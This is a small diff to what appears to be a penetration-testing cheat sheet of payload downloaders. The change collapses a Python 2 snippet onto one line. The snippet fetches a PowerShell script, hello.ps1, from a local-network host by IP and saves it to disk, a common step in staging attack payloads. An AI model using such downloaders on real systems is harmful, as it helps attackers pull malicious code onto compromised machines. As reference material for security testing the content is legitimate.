@@ -2131,12 +2131,7 @@ desktopimgdownldr Downloaders<br />
 <br />
 Python Downloaders<br />
 
-      #!/usr/bin/python
-      import urllib2
-      u = urllib2.urlopen('http://192.168.1.73/hello.ps1')
-      localFile = open('local_file', 'w')
-      localFile.write(u.read())
-      localFile.close()
+      #!/usr/bin/python;import urllib2;u = urllib2.urlopen('http://192.168.1.73/hello.ps1');localFile = open('local_file', 'w');localFile.write(u.read());localFile.close()
 
 <br />
 VbScript Downloaders (VBS)<br />
